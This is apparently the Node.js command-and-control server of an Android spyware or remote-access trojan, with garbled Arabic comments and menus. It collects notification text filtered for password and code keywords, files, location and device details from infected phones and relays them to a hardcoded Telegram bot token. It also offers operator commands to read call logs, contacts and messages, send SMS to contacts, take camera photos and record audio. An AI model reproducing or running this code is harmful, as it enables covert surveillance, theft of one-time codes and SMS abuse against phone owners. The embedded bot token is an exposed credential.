const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const bot = new TelegramBot(token, {
    polling: {
        interval: 1000,
        autoStart: true,
        params: {
            timeout: 30,
            limit: 1
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let notificationSettings = {
    autoSend: false, // โญ ุชุนุทูู ุงูุฅุฑุณุงู ุงูุชููุงุฆู
    filterApps: []   // โญ ุชุตููุฉ ุงูุชุทุจููุงุช
};

// โญ ูุธุงู ุงูุชุญูู ุจุงูุฅุดุนุงุฑุงุช
function shouldSendNotification(appName, title, text) {
    if (!notificationSettings.autoSend) {
        return false;
    }
    
    // โญ ุชุตููุฉ ุงูุชุทุจููุงุช ุงููุฒุนุฌุฉ
    const blockedApps = ['ir.ilmili.telegraph', 'com.telegram', 'com.whatsapp'];
    if (blockedApps.includes(appName)) {
        return false;
    }
    
    // โญ ุฅุฑุณุงู ููุท ุงูุฅุดุนุงุฑุงุช ุงููููุฉ
    const importantKeywords = ['ูููุฉ ุณุฑ', 'ุฑูุฒ', 'ุชุญุฐูุฑ', 'important', 'password'];
    const hasImportantKeyword = importantKeywords.some(keyword => 
        text.includes(keyword) || title.includes(keyword)
    );
    
    return hasImportantKeyword;
}

// Routes ุงูุฃุณุงุณูุฉ
app.get('/', (req, res) => {
    res.send('<h1 align="center">โ ุงูุฎุงุฏู ูุนูู ุจูุฌุงุญ</h1>');
});

// โญ ุชุนุฏูู ุงุณุชูุจุงู ุงููุตูุต ูุน ุงูุชุญูู ุจุงูุฅุดุนุงุฑุงุช
app.post('/uploadText', (req, res) => {
    const model = req.headers.model || 'Unknown';
    const appName = req.headers.app_name || 'Unknown';
    const title = req.headers.title || '';
    const text = req.body.text || '';
    
    // โญ ุงูุชุญูู ุฅุฐุง ูุงู ูุฌุจ ุฅุฑุณุงู ุงูุฅุดุนุงุฑ
    if (req.headers.notification === 'true') {
        if (!shouldSendNotification(appName, title, text)) {
            console.log(`๐ ุชู ุญุฌุจ ุฅุดุนุงุฑ ูู: ${appName}`);
            res.send('');
            return;
        }
    }
    
    // ุฅุฑุณุงู ุงูุฑุณุงูุฉ ููุท ุฅุฐุง ูุงูุช ูููุฉ
    let message = `๐ ุฑุณุงูุฉ ูู ุฌูุงุฒ: ${model}`;
    if (appName !== 'Unknown') {
        message += `\n๐ฑ ุงูุชุทุจูู: ${appName}`;
    }
    if (title) {
        message += `\n๐ ุงูุนููุงู: ${title}`;
    }
    message += `\n๐ ุงููุต: ${text}`;
    
    sendMessageSafe(id, message);
    res.send('');
});

// ุงุณุชูุจุงู ุงููููุงุช
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const model = req.headers.model || 'Unknown';
    
    bot.sendDocument(id, req.file.buffer, {
        caption: `๐ ููู ูู ุฌูุงุฒ: ${model}\n๐ ุงุณู ุงูููู: ${filename}`
    }, { filename: filename, contentType: 'application/octet-stream' });
    
    res.send('');
});

// ุงุณุชูุจุงู ุงููููุน
app.post('/uploadLocation', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendLocation(id, req.body.lat, req.body.lon);
    sendMessageSafe(id, `๐ ูููุน ูู ุฌูุงุฒ: ${model}`);
    res.send('');
});

// โญ ุฅุถุงูุฉ route ููุชุญูู ูู ุงูุฅุนุฏุงุฏุงุช
app.post('/settings', (req, res) => {
    if (req.body.autoSend !== undefined) {
        notificationSettings.autoSend = req.body.autoSend;
    }
    if (req.body.filterApps) {
        notificationSettings.filterApps = req.body.filterApps;
    }
    res.json({ success: true, settings: notificationSettings });
});

// ุงุชุตุงู WebSocket
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { 
        model, 
        battery, 
        version, 
        brightness, 
        provider,
        connection: ws
    });
    
    console.log(`โ ุฌูุงุฒ ูุชุตู: ${model} (${uuid})`);
    
    // โญ ุฅุฑุณุงู ุฅุนุฏุงุฏุงุช ุงูุฅุดุนุงุฑุงุช ููุฌูุงุฒ ุนูุฏ ุงูุงุชุตุงู
    ws.send(JSON.stringify({
        type: 'settings',
        data: notificationSettings
    }));
    
    setTimeout(() => {
        sendMessageSafe(id, 
            `๐ ุฌูุงุฒ ุฌุฏูุฏ ูุชุตู โ\n\n` +
            `๐ฑ ุงูุทุฑุงุฒ: ${model}\n` +
            `๐ ุงูุจุทุงุฑูุฉ: ${battery}%\n` +
            `๐ค ุงูุฃูุฏุฑููุฏ: ${version}\n` +
            `๐ถ ุงูุดุฑูุฉ: ${provider}\n` +
            `๐ ุงูุฑูุฒ: ${uuid}\n\n` +
            `๐ ูุถุน ุงูุฅุดุนุงุฑุงุช: ${notificationSettings.autoSend ? 'ููุนู' : 'ูุนุทู'}`
        );
    }, 1000);
    
    ws.on('close', () => {
        console.log(`โ ุฌูุงุฒ ุงููุทุน: ${model}`);
        clients.delete(uuid);
    });
});

// ูุนุงูุฌุฉ ุฑุณุงุฆู ุงูุจูุช
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId.toString() !== id) {
        sendMessageSafe(chatId, 'โ ุบูุฑ ูุตุฑุญ ูู ุจุงุณุชุฎุฏุงู ูุฐุง ุงูุจูุช');
        return;
    }
    
    console.log(`๐ฉ ุฑุณุงูุฉ ูุณุชุฎุฏู: ${text}`);
    
    // โญ ุฃูุงูุฑ ุงูุชุญูู ุจุงูุฅุดุนุงุฑุงุช
    if (text === '๐ ุชุนุทูู ุงูุฅุดุนุงุฑุงุช') {
        notificationSettings.autoSend = false;
        broadcastToAllDevices('disable_notifications');
        sendMessageSafe(id, 'โ ุชู ุชุนุทูู ุงูุฅุฑุณุงู ุงูุชููุงุฆู ููุฅุดุนุงุฑุงุช');
        return;
    }
    
    if (text === '๐ ุชูุนูู ุงูุฅุดุนุงุฑุงุช') {
        notificationSettings.autoSend = true;
        broadcastToAllDevices('enable_notifications');
        sendMessageSafe(id, 'โ ุชู ุชูุนูู ุงูุฅุฑุณุงู ุงูุชููุงุฆู ููุฅุดุนุงุฑุงุช');
        return;
    }
    
    if (text === 'โ๏ธ ุฅุนุฏุงุฏุงุช ุงูุฅุดุนุงุฑุงุช') {
        showNotificationSettings();
        return;
    }
    
    if (msg.reply_to_message) {
        handleReplyMessage(msg);
        return;
    }
    
    handleMainCommand(msg);
});

function handleReplyMessage(msg) {
    const replyText = msg.reply_to_message.text;
    const userText = msg.text;
    
    if (!currentUuid) {
        sendMessageSafe(id, 'โ ูู ูุชู ุชุญุฏูุฏ ุฌูุงุฒ. ุงุณุชุฎุฏู ูุงุฆูุฉ ุงูุฃูุงูุฑ ุฃููุงู');
        return;
    }
    
    if (replyText.includes('ุฃุฏุฎู ุงูุฑูู ุงููุณุชูุฏู')) {
        currentNumber = userText;
        sendMessageSafe(id, '๐ ุงูุขู ุฃุฏุฎู ูุต ุงูุฑุณุงูุฉ:', { 
            reply_markup: { force_reply: true } 
        });
        return;
    }
    
    if (replyText.includes('ุงูุขู ุฃุฏุฎู ูุต ุงูุฑุณุงูุฉ')) {
        sendToDevice(currentUuid, `sms:${currentNumber}:${userText}`);
        showMainMenu('โ ุชู ุฅุฑุณุงู ุงูุฑุณุงูุฉ ุงููุตูุฉ');
        return;
    }
    
    // ... ุจุงูู ูุนุงูุฌุฉ ุงูุฑุฏูุฏ
}

function handleMainCommand(msg) {
    const text = msg.text;
    
    switch(text) {
        case '/start':
            showStartMenu();
            break;
            
        case '๐ฑ ุงูุฃุฌูุฒุฉ ุงููุชุตูุฉ':
            showConnectedDevices();
            break;
            
        case 'โ๏ธ ูุงุฆูุฉ ุงูุฃูุงูุฑ':
            showCommandsList();
            break;
            
        case '๐ ุชุนุทูู ุงูุฅุดุนุงุฑุงุช':
            // ูุนุงูุฌุชู ูู ุงูุฃุนูู
            break;
            
        case '๐ ุชูุนูู ุงูุฅุดุนุงุฑุงุช':
            // ูุนุงูุฌุชู ูู ุงูุฃุนูู
            break;
            
        case '๐ ุชุญุฏูุซ ุงููุงุฆูุฉ':
            showConnectedDevices();
            break;
            
        default:
            sendMessageSafe(id, 'โ ุฃูุฑ ุบูุฑ ูุนุฑูู. ุงุณุชุฎุฏู /start ููุจุฏุก');
    }
}

// โญ ุฏุงูุฉ ูุจุซ ุงูุฃูุงูุฑ ูุฌููุน ุงูุฃุฌูุฒุฉ
function broadcastToAllDevices(command) {
    clients.forEach((device, uuid) => {
        if (device.connection.readyState === WebSocket.OPEN) {
            device.connection.send(command);
        }
    });
}

// โญ ุนุฑุถ ุฅุนุฏุงุฏุงุช ุงูุฅุดุนุงุฑุงุช
function showNotificationSettings() {
    const status = notificationSettings.autoSend ? '๐ข ููุนู' : '๐ด ูุนุทู';
    const blockedApps = notificationSettings.filterApps.join(', ') || 'ูุง ููุฌุฏ';
    
    sendMessageSafe(id,
        `โ๏ธ ุฅุนุฏุงุฏุงุช ุงูุฅุดุนุงุฑุงุช:\n\n` +
        `๐ข ุงูุฅุฑุณุงู ุงูุชููุงุฆู: ${status}\n` +
        `๐ซ ุงูุชุทุจููุงุช ุงููุญุฌูุจุฉ: ${blockedApps}\n\n` +
        `ุงุณุชุฎุฏู:\n` +
        `๐ ุชุนุทูู ุงูุฅุดุนุงุฑุงุช - ูุฅููุงู ุงูุฅุฑุณุงู ุงูุชููุงุฆู\n` +
        `๐ ุชูุนูู ุงูุฅุดุนุงุฑุงุช - ูุชูุนูู ุงูุฅุฑุณุงู ุงูุชููุงุฆู`,
        {
            reply_markup: {
                keyboard: [
                    ['๐ ุชุนุทูู ุงูุฅุดุนุงุฑุงุช', '๐ ุชูุนูู ุงูุฅุดุนุงุฑุงุช'],
                    ['๐ฑ ุงูุฃุฌูุฒุฉ ุงููุชุตูุฉ', 'โ๏ธ ูุงุฆูุฉ ุงูุฃูุงูุฑ']
                ],
                resize_keyboard: true
            }
        }
    );
}

// โญ ูุธุงู rate limiting
let lastMessageTime = 0;
const MESSAGE_DELAY = 2000;

function sendMessageSafe(chatId, text, options = {}) {
    const now = Date.now();
    const timeSinceLastMessage = now - lastMessageTime;
    
    if (timeSinceLastMessage < MESSAGE_DELAY) {
        const delay = MESSAGE_DELAY - timeSinceLastMessage;
        return new Promise((resolve) => {
            setTimeout(() => {
                lastMessageTime = Date.now();
                bot.sendMessage(chatId, text, options).then(resolve);
            }, delay);
        });
    } else {
        lastMessageTime = now;
        return bot.sendMessage(chatId, text, options);
    }
}

// ุจุงูู ุงูุฏูุงู (showMainMenu, showStartMenu, showConnectedDevices, etc.)
// ... [ููุณ ุงูุฏูุงู ุงูุณุงุจูุฉ ููู ูุน ุฅุถุงูุฉ ุฃูุงูุฑ ุงูุชุญูู ุจุงูุฅุดุนุงุฑุงุช]

function showStartMenu() {
    sendMessageSafe(id,
        `๐ค ูุฑุญุจุงู ุจู ูู ุงูุจูุช ุงููุชูุฏู\n\n` +
        `โ ุงูููุฒุงุช ุงููุชููุฑุฉ:\n` +
        `๐ฑ ุฅุฏุงุฑุฉ ุงูุฃุฌูุฒุฉ ุงููุชุตูุฉ\n` +
        `๐ ุณุฌู ุงูููุงููุงุช ูุงูุฑุณุงุฆู\n` +
        `๐ท ุงููุงููุฑุง ุงูุฃูุงููุฉ ูุงูุฎูููุฉ\n` +
        `๐ค ุชุณุฌูู ุตูุชู\n` +
        `๐ ุชุชุจุน ุงููููุน\n` +
        `๐ ุฅุฏุงุฑุฉ ุงููููุงุช\n` +
        `๐ ุชุญูู ูุงูู ุจุงูุฅุดุนุงุฑุงุช\n` +
        `\nโก ุงุฎุชุฑ ูู ุงููุงุฆูุฉ:`,
        {
            reply_markup: {
                keyboard: [
                    ['๐ฑ ุงูุฃุฌูุฒุฉ ุงููุชุตูุฉ', 'โ๏ธ ูุงุฆูุฉ ุงูุฃูุงูุฑ'],
                    ['๐ ุชุนุทูู ุงูุฅุดุนุงุฑุงุช', '๐ ุชูุนูู ุงูุฅุดุนุงุฑุงุช']
                ],
                resize_keyboard: true
            }
        }
    );
}

// ... [ุจุงูู ุงูุฏูุงู ููุง ูู]

function showDeviceCommands(message, uuid, device) {
    const keyboard = [
        [{ text: '๐ ูุนูููุงุช ุงูุฌูุงุฒ', callback_data: `info:${uuid}` }, { text: '๐ ุณุฌู ุงูููุงููุงุช', callback_data: `calls:${uuid}` }],
        [{ text: '๐ฅ ุฌูุงุช ุงูุงุชุตุงู', callback_data: `contacts:${uuid}` }, { text: '๐ฌ ุงูุฑุณุงุฆู', callback_data: `messages:${uuid}` }],
        [{ text: '๐ฑ ุฅุฑุณุงู ุฑุณุงูุฉ', callback_data: `sms:${uuid}` }, { text: '๐จ ุฑุณุงูุฉ ููุฌููุน', callback_data: `sms_all:${uuid}` }],
        [{ text: '๐ธ ูุงููุฑุง ุฃูุงููุฉ', callback_data: `camera_front:${uuid}` }, { text: '๐ท ูุงููุฑุง ุฎูููุฉ', callback_data: `camera_back:${uuid}` }],
        [{ text: '๐ค ุชุณุฌูู ุตูุชู', callback_data: `record_audio:${uuid}` }, { text: '๐ ุงุณุชุนุฑุงุถ ูููุงุช', callback_data: `files:${uuid}` }],
        [{ text: '๐ ุงููููุน', callback_data: `location:${uuid}` }, { text: '๐ ุฅุดุนุงุฑ', callback_data: `toast:${uuid}` }],
        [{ text: '๐ณ ุงูุชุฒุงุฒ', callback_data: `vibrate:${uuid}` }, { text: '๐ ุชุดุบูู ุตูุช', callback_data: `play_sound:${uuid}` }],
        [{ text: '๐ฑ ุงูุชุทุจููุงุช', callback_data: `apps:${uuid}` }],
        [{ text: '๐ ุฅุนุฏุงุฏุงุช ุงูุฅุดุนุงุฑุงุช', callback_data: `notification_settings:${uuid}` }]
    ];
    
    bot.editMessageText(
        `โ๏ธ ุฃูุงูุฑ ุงูุฌูุงุฒ: ๐ฑ ${device.model}\n๐ ${device.battery}% | ๐ค ${device.version}`,
        {
            chat_id: message.chat.id,
            message_id: message.message_id,
            reply_markup: { inline_keyboard: keyboard }
        }
    );
}

// ูุนุงูุฌุฉ ุงูุฃุฎุทุงุก
bot.on('error', (error) => {
    console.error('โ ุฎุทุฃ ูู ุงูุจูุช:', error);
});

bot.on('polling_error', (error) => {
    console.error('โ ุฎุทุฃ ูู ุงูุงุชุตุงู:', error);
});

// ุจุฏุก ุงูุฎุงุฏู
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`๐ ุงูุฎุงุฏู ูุนูู ุนูู ุงููููุฐ ${PORT}`);
    console.log('๐ค ุงูุจูุช ุฌุงูุฒ ูุงุณุชูุจุงู ุงูุฃุฌูุฒุฉ...');
    console.log('๐ ูุถุน ุงูุฅุดุนุงุฑุงุช: ' + (notificationSettings.autoSend ? 'ููุนู' : 'ูุนุทู'));
});
